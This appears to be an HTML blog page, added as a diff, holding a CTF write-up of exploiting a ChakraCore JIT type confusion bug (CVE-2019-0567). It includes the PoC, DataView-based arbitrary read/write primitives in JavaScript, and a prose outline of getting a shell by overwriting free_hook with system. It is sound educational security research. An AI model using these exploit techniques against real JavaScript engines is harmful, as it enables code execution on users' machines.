@@ -1,0 +1,426 @@
+<html>
+    <head>
+        <!-- <link rel="stylesheet" href="https://unpkg.com/xp.css@0.2.3/dist/98.css" /> -->
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <link rel="stylesheet" href="https://unpkg.com/xp.css" />
+        <link rel="stylesheet" href="assets/css/style.css" />
+        <link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/themes/prism.min.css"/>
+        <link rel="stylesheet" href="css/styles/default.css">
+
+  <link rel="stylesheet" href="../css/bootstrap.css">
+
+    </head>
+    <body>
+
+        <!-- PAGE CONTENT START -->
+        <div class="container">
+
+            <!-- PAGE HEAD START -->
+            <div class="container-body">
+                <div class="" style="margin: 0 auto; width: 70%">
+                        <a href="../index.html"><button aria-controls="HOME" style="border-bottom-left-radius: 0; border-bottom-right-radius: 0;">HOME</button></a>
+                        <a href="../blog.html"><button aria-controls="BLOG" style="border-bottom-left-radius: 0; border-bottom-right-radius: 0;">BLOG</button></a>
+                        <a href="../about.html"><button aria-controls="ABOUT" style="border-bottom-left-radius: 0; border-bottom-right-radius: 0;">ABOUT</button></a>
+                </div>
+            </div>
+
+            <div class="container-head">
+                <br>
+                <span id="title"><span style="color: black;">✨ ChakraCore ✨</span></span>
+                <br>
+            </div>
+
+            <br><br><br>
+
+            <!-- PAGE BODY START -->
+            <div class="container-body">
+                <div class="window" style="margin: 0 auto; width: 70%">
+                    <div class="title-bar">
+                        <div class="title-bar-text">
+                        WRITEUP
+                        </div>
+                        <div class="title-bar-controls">
+                            <button aria-label="Minimize" id="min_btn"></button>
+                            <button aria-label="Maximize" id="max_btn"></button>
+                        </div>
+                    </div>
+                    <div class="window-body" id="box1-body">
+                        <div class="box-text box-section">
+                            💬Introduction:
+                            <ul class="tree-view description" style="font-family: Arial !important;">
+                                <li> 
+                                    ChakraCore was a challenge at <strong style="color: purple">Trend Micro CTF 2019 Quals</strong> in Exploit category, worth 400p.
+                                    I have attempted this challenge during the CTF but endedup solving it with an unintended solution. Now, one year later, I decided 
+                                    to challenge myself to solve the task the proper way.
+                                </li>
+                                <li>
+                                    Since we will be in a <strong style="color: #0046d5">Microsoft</strong> context, 
+                                    I decided to take advantage of this and use this beautiful CSS library ( <a href="https://botoxparty.github.io/XP.css/">https://botoxparty.github.io/XP.css/</a> ) that offers a visual look similar to that of the <strong style="color: #0046d5">Windows XP</strong> operating system.
+                                </li>
+                                <li>
+                                    Without further ado, enjoy the writeup! 🙂
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="box-text box-section">
+                            📜Descritpion:
+                            <ul class="tree-view description" style="font-family: Arial !important;">
+                                <li>
+                                    Chakra is the JavaScript engine, developed by Microsoft, which is used to power Microsoft Edge. ChakraCore represents a majority of Chakra made open-source ( <a href="https://github.com/microsoft/ChakraCore">https://github.com/microsoft/ChakraCore</a> )  .
+                                </li>
+                                <li>For this challenge, we are given 3 files: 
+                                    <ul class="tree-view" style="border-right: 0px; border-top: 0px; border-bottom: 0px;">
+                                        <li>ch</li>
+                                        <li>libChakraCore.so</li>
+                                        <li>patch.diff</li>
+                                      </ul>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="box-text box-section">    
+                            Challenge Files:
+                            <br>
+                            <button>📄 ch</button>
+                            <button>📄 libChakraCore.so</button>
+                            <button>📄 patch.diff</button>
+                        </div>
+                        <div class="box-text box-section">    
+                            ⚠️Patch:<br>
+                            <section class="tabs">
+                            <menu role="tablist">
+                                <button aria-selected="true" aria-controls="analy">Analysis</button>
+                                <button aria-controls="file">File</button>
+                            </menu>
+                            <article role="tabpanel" id="analy">
+                                  <p class="description">The patch file is very small (you can see it in the File tab). By quickly looking at it, we observe that the <code>Js::OpCode::InitProto</code> case has been removed.</p>
+                                  <p class="description">What does this mean? We don't know yet, we could take a look at the <a href="https://github.com/microsoft/ChakraCore/blob/master/lib/Backend/GlobOptFields.cpp">source code</a> and understand the side effects of the patch, but before we dive into the huge source code, I propose we <span style="font-weight: bold"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></span> it. </p>
+                                  <p class="description">Among the first search results we can find many results that contain the text <code>CVE-2019-0567</code>. If we search for this keyword, specifically, we can find <a href="https://github.com/tunz/js-vuln-db/blob/master/chakra/CVE-2019-0567.md">this</a> web page.</p>
+                                  <p class="description">It is a <code>POC</code> for the specific CVE. Looking at the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1702">bug report</a> we can see that the vulnerability was discovered bu the legend <strong style="color: #0046d5">Lokihardt</strong>. He states that:</p>
+                                  <blockquote>
+                                    NewScObjectNoCtor and InitProto opcodes are treated as having no side effects, but actually they can have via the SetIsPrototype method of the type handler that can cause transition to a new type. This can lead to type confusion in the JITed code.
+
+                                    In the PoC, it overwrites the pointer to property slots with 0x1000000001234. 
+                                  </blockquote>
+                                  <p class="description">So we are dealing with a <code>JIT</code> vulnerability. Basically, what happens is that the JIT compiler thinks that if we set an object's <code>__prototype__</code> there will be no side effects, which is not the case.</p>
+                                  <p class="description">If we run the POC, we can see the following <code>SegFaul</code>:</p>
+                                        
+                                  <fieldset>
+                                    <legend>gdb ./ch</legend>
+                                        <div style="width:100%;">
+                                            <div>
+                                                <img src="./src/p3-poc.png" style="width:100%" />
+                                            </div>
+                                        </div>
+                                    <label style="padding-top:5px;">You can see that it attempts to access the value located at address 0x1000000001234 which is an invalid address (not mapped).</label>
+                                  </fieldset>
+                                    
+                            </article>
+                          
+                            <article role="tabpanel" hidden id="file">
+                                <img style="width: 100%" src="./src/p3-patch.png" />
+                            </article>
+                            </section>
+                        </div>
+
+                        <div class="box-text box-section">
+                            🔬Debugging:
+                            <ul class="tree-view description" style="font-family: Arial !important;">
+                                <li> 
+                                    Because the executable is missing debugging information, I will build a new one including the patch.
+
+                                </li>
+                                <li>
+                                    <pre style="background-color:#048284;margin: 0 auto;box-shadow: inset -1px -1px #0a0a0a, inset 1px 1px #dfdfdf, inset -2px -2px grey, inset 2px 2px #fff;">
+# Clone project
+$ git clone https://github.com/microsoft/ChakraCore.git
+$ cd ChakraCore 
+
+# Checkout to a commit where the patch is applicable
+git checkout e79d68a8c0f9d31b4074bbf6d7a9013693f142ec
+
+# Apply the patch
+$ patch -p1 < patch.diff
+
+# Compile chakra
+$ ./build.sh --static --debug -j=4</pre>
+                                </li>
+                                <li>
+                                    Alright, now we got an executable with symbols. However, comparing ChakraCore to <code>v8</code>, there is no <code>%DebugPrint()</code> equivalent. So how can we prin information about our objects?
+                                </li>
+                                <li>
+                                    A method which worked well for me was to set a breakpoint at <code>WScriptJsrt::EchoCallback(void*, bool, void**, unsigned short, void*)</code> and thus, whenever I will call <code>console.log(obj)</code> I will hit the breakpoint inside the debugger.
+                                </li>
+                                <li>
+                                    Once we hit the breakpoint, we have to print <code>arguments[1]</code> and that's where the address of our object will be.
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="box-text box-section">
+                            🗺️Memory Layout:
+                            <section class="tabs">
+                                <menu role="tablist">
+                                    <button aria-selected="true" aria-controls="lay">Object Layout</button>
+                                    <button aria-controls="l3">Layout3</button>
+                                    <button aria-controls="l1">Layout1</button>
+                                </menu>
+                                <article role="tabpanel" id="lay">
+                                    <p class="description">
+                                        Before we dive into the exploitation part, I would like to introduce the memory layout of JavaScript Objects.
+                                    </p>
+                                    <p class="description">
+                                        As described in the <a href="https://github.com/microsoft/ChakraCore/blob/master/lib/Runtime/Types/DynamicObject.h">source code</a>, JavaScript Objects can have one of the following 3 shapes:
+                                    </p>
+                                    <img src="src/p3-mem-layout.PNG" style="width:80%">
+                                </article>
+                                <article hidden role="tabpanel" id="l3">
+                                    <p class="description">Let's consider the following object. In the memory it will have memory layout <code>#3</code>.</p>
+                                    <img src="src/p3-ob1.PNG" style="width:80%;">
+                                </article>
+                                <article hidden role="tabpanel" id="l1">
+                                    <p class="description">Interestingly, when we add new members to the object, it will change it's layout to <code>#1</code>.</p>
+                                    <img src="src/p3-ob2.PNG" style="width:80%;">
+                                </article>   
+                             </section>   
+                        </div>
+
+                        <div class="box-text box-section">
+                            💣Exploitation:
+                            <ul class="tree-view description" style="font-family: Arial !important;">
+                                <li> 
+                                    From the POC we know that we are dealing with a <code>JIT type confusion</code>, but what is a type confusion vulnerability and what is JIT?
+                                </li>
+                                <li>
+                                    <blockquote style="margin:0px;">
+                                        just-in-time (JIT) compilation is a way of executing computer code that involves compilation during execution of a program – at run time – rather than before execution.
+                                    </blockquote>
+
+                                </li>    
+                                <li>
+                                    A well prezented explanation of JIT Compilers can be found at <a href="https://hacks.mozilla.org/2017/02/a-crash-course-in-just-in-time-jit-compilers/">this</a> link, but the keypoint to remember is that whenever there is a function called many times, it is considered hot, and the jit will attempt to compile it and execut machine code directly, thus improving the performance.
+                                </li>   
+                                <li>
+                                    The type confusion vulnerability, like the name states, is a vulnerability where the program thinks it's dealing with a type A, when the reality is that it is dealing with a type B. Usually type confusion vulnerabilities can lead to other vulnerabilitiess such as: buffer overflows, use-after-free, etc.
+                                    <a href="https://hackingportal.github.io/Type_Confusion/type_confusion.html">Here</a> you can find more information on type confusion vulnerabilities.
+                                </li>   
+                                <p></p>
+                                <pre style="background-color:#048284;margin: 0 auto;box-shadow: inset -1px -1px #0a0a0a, inset 1px 1px #dfdfdf, inset -2px -2px grey, inset 2px 2px #fff;">
+function opt(o, proto, value) {
+    o.b = 1;
+    let tmp = {__proto__: proto};
+    o.a = value;
+}
+
+function main() {
+    for (let i = 0; i < 2000; i++) {
+        let o = {a: 1, b: 2};
+        opt(o, {}, {});
+    }
+
+    let o = {a: 1, b: 2};
+    opt(o, o, 0x1234);
+    print(o.a);
+}
+
+main();</pre>
+                                <li>Now that we have cleared this, let's take a closer look at the POC. We see that there are 2 functions: <code>main</code> and <code>opt</code>.</li> 
+                                <li>The function opt is called 2000 times in the for loop. In other words, it attempts to make the function <code>HOT</code>.</li>
+                                <li>The function opt receives 3 parameters:
+                                    <ul class="tree-view" style="border-right: 0px; border-top: 0px; border-bottom: 0px;">
+                                        <li>o - object with 2 properties</li>
+                                        <li>proto - empty object used to set the <code>__prototype__</code> of another object <code>tmp</code></li>
+                                        <li>value - empty object</li>
+                                      </ul>
+                                </li>    
+                                <li>Like we've said earlier, JIT thinks that <code>Js::OpCode::InitProto</code> has no side effects. Bu if we analyze closely with the debugger, we can see that the layout of the object is actually changed.</li>                 
+                                <li>
+                                    <img src="src/p3-proto.png" width="100%">
+                                </li>
+                                <li>Now, when we attempt to access property <code>obj.a</code> we will access <code>obj.auxSlots</code>. So in the POC we can see that <code>auxSlots</code> is ovrerwritten with value 0x1234 (which internally is represented as follows: <code>0x1000000001234</code>, the 1 bit represents a non-pointer value.</li>
+                                <li>
+                                    <label>For more information about Chakra's memory layout, I strongly recommend Bruno Keith's  <a href="https://www.youtube.com/watch?v=lBL4KGIybWE&ab_channel=MicrosoftIsraelR%26DCenter"> presentation</a>.</label>
+                                </li>
+                                <p></p>
+                                <li>
+                                    Alright, now that we know how the vulnerability is triggered and what happens at the memory level, let's see how can we profit from this to achieve <code>arbitrary read and write</code>.
+                                </li>
+                                <li>
+                                    If we create a new object of type #1 and use it to overwrite the <code>auxSlots</code> pointer, we will end up with something like this:
+                                </li>
+                                <li>
+                                    <img src="src/p3-step1.png" style="width:100%">
+                                </li>
+                                <li>Now, our target is to overwrite the <code>auxSlots</code> pointer frmo the second object with a <code>DataView</code>. But as we can see in the blue figure, the layout of the object maps property <code>a</code> to the vtable and property <code>b</code> to the type member. Thus we need to include a new member <code>c</code> in order to overwrite the auxSlots pointer. </li>
+                                <li><pre style="background-color:#048284;margin: 0 auto;box-shadow: inset -1px -1px #0a0a0a, inset 1px 1px #dfdfdf, inset -2px -2px grey, inset 2px 2px #fff;">
+dv1 = new DataView(new ArrayBuffer(0x100));
+o.c = dv1;</pre></li>
+                                <li>We will obtain the following:</li>
+                                <li>
+                                    <img src="src/p3-step2.png" style="width:100%">
+                                </li>
+                                <li>
+                                    Perfect! Now as we can see, what is interesting for us is the <code>buffer</code> pointer. If we manage to set it to an arbitrary memory area, we will be able to perform arbitrary read / write. However, there are a few issues:
+                                    <ul class="tree-view" style="border-right: 0px; border-top: 0px; border-bottom: 0px;">
+                                        <li>1. Our 2nd object only has 2 members and we are only able to overwrite either the <code>vtable</code> or the <code>type</code> property.</li>
+                                        <li>2. If we could overwrite the <code>buffer</code> pointer, because it would contain the 1 bit set because it is not a pointer.</li>
+                                      </ul>
+                                </li>
+                                <li>So, how can we overcome these issues?</li>
+                                <li>For the first issue, an easy bypass would be to simply allocate an object with at least 8 properties:
+                                    <pre style="background-color:#048284;margin: 0 auto;box-shadow: inset -1px -1px #0a0a0a, inset 1px 1px #dfdfdf, inset -2px -2px grey, inset 2px 2px #fff;">
+let obj = {};
+obj.unu = 0x41414141;
+obj.doi = 2;
+obj.trei = 3;
+obj.patru = 4;
+obj.cinci = 5;
+obj.sase = 6;
+obj.sapte = 7;
+obj.opt = 8;
+obj.noua = 9;</pre>
+                                </li>
+                                <li>Now, if we perform <code>obj.opt = VALUE</code> we corrupted the buffer pointer.</li>
+                                <li>Lastly, the 2nd issue can be treated as follows: overwrite the buffer pointer with another <code>DataView</code> and then use the first one to overwrite the <code>buffer</code> pointer of the 2nd DataView.</li>
+                                <li>Thus, we can achieve arbitrary <code>READ</code> and <code>WRITE</code> by contsantly adjusting the buffer pointer of the second DataView and then writing or reading from there.</li>
+                                <li>
+                                    <div class="row">
+                                        <div class="col-lg-6">
+                                            <p><code>READ</code> primitive</p>
+                                            <pre style="background-color:#048284;margin: 0 auto;box-shadow: inset -1px -1px #0a0a0a, inset 1px 1px #dfdfdf, inset -2px -2px grey, inset 2px 2px #fff;">
+function read(where1, where2){
+
+    dv1.setUint32(7*0x8, where1, true);
+    dv1.setUint32(7*0x8+0x4, where2, true);
+    
+    let ret = '0x' 
+    ret += dv2.getUint32(4, true).toString(16) 
+    ret += dv2.getUint32(0, true).toString(16);
+
+    return ret
+};</pre>
+                                        </div>
+                                        <div class="col-lg-5">
+                                            <p><code>WRITE</code> primitive</p>
+                                            <pre style="background-color:#048284;margin: 0 auto;box-shadow: inset -1px -1px #0a0a0a, inset 1px 1px #dfdfdf, inset -2px -2px grey, inset 2px 2px #fff;">
+function write(what1, what2, where1, where2){
+
+    dv1.setUint32(7*0x8, where1, true);
+    dv1.setUint32(7*0x8+0x4, where2, true);
+
+    dv2.setUint32(0, what1, true);
+    dv2.setUint32(0x4, what2, true);
+
+};</pre>
+                                        </div>
+                                    </div>
+                                </li>
+                                <p></p>
+                                <li>
+                                    Alright, so right now, we have the ability to read from everywhere and write from everywhere, can can we pop a shell?
+                                </li>
+                                <li>Well, we first need a memory leak. We can obtain that very easy by reading the <code>vtable</code> pointer of the 2nd DataView. With this leak we are able to locate the GOT entry of the <code>free</code> function which is located at offset <code>0x00000000023354d0</code>.</li>
+                                <li>From there, we can leak the libc address.</li>
+                                <li>Once we got a <code>libc</code> leak, we can use a neat trick which is to overwrite the <code>free_hook</code> with the address of the <code>system</code> function and then call <code>console.log("/bin/sh\x00")</code> which will trigger the <code>free_hook</code> because of the <a href="https://github.com/microsoft/ChakraCore/blob/master/bin/ch/WScriptJsrt.cpp">following snippet</a>.</li>
+                            </ul>
+                        </div>
+
+                        <div class="box-text">
+                            🚩Flag:
+                            <blockquote>TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}</blockquote>
+                        </div>
+
+                        <div class="box-text box-section">
+                            💬Conclusion:
+                            <ul class="tree-view description" style="font-family: Arial !important;">
+                                <li> 
+                                    As always, I hope this post was useful to you and you found something useful or new in it. 
+                                    If not, it will be just a reminder for me when I'll encounter similar problems. 😅
+                                </li>
+                                <li>
+                                    Until next time.
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="box-text box-section">
+                            🌐Resources:
+                            <ul class="tree-view description" style="font-family: Arial !important;">
+                                <li> 
+                                    <ul class="tree-view" style="border-right: 0px; border-top: 0px; border-bottom: 0px;">
+                                        <li>https://perception-point.io/cve-2019-0539-exploitation/</li>
+                                        <li>https://github.com/microsoft/ChakraCore</li>
+                                        <li>https://bruce30262.github.io/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/</li>
+                                        <li>https://www.youtube.com/watch?v=xp1YDOtWohw&ab_channel=media.ccc.de</li>
+                                        <li>https://www.youtube.com/watch?v=lBL4KGIybWE&ab_channel=MicrosoftIsraelR%26DCenter</li>
+                                      </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <!-- <div class="box-text">    
+                            Submit
+                            <br>
+                            <button>✅ SUBMIT</button>
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- PAGE CONTENT STOP -->
+
+
+        <script>
+            // box buttons functionality
+            $("#min_btn").click(function () {
+                $("#box1-body").css("display", "none");
+            });
+            $("#max_btn").click(function () {
+                $("#box1-body").css("display", "block");
+            });
+
+            const tabs = document.querySelectorAll("menu[role=tablist]");
+
+            for (let i = 0; i < tabs.length; i++) {
+                const tab = tabs[i];
+
+                const tabButtons = tab.querySelectorAll("menu[role=tablist] > button");
+
+                tabButtons.forEach((btn) =>
+                    btn.addEventListener("click", (e) => {
+                    e.preventDefault();
+
+                    tabButtons.forEach((button) => {
+                        if (
+                        button.getAttribute("aria-controls") ===
+                        e.target.getAttribute("aria-controls")
+                        ) {
+                        button.setAttribute("aria-selected", true);
+                        openTab(e, tab);
+                        } else {
+                        button.setAttribute("aria-selected", false);
+                        }
+                    });
+                    })
+                );
+            }
+
+            function openTab(event, tab) {
+                const articles = tab.parentNode.querySelectorAll('[role="tabpanel"]');
+                articles.forEach((p) => {
+                    p.setAttribute("hidden", true);
+                });
+                const article = tab.parentNode.querySelector(
+                    `[role="tabpanel"]#${event.target.getAttribute("aria-controls")}`
+                );
+                article.removeAttribute("hidden");
+            }
+
+
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/prism.min.js"></script>
+        <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="FetchDEX" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#79D6B5" data-position="" data-x_margin="10" data-y_margin="30"></script>
+
+    </body>
+</html>
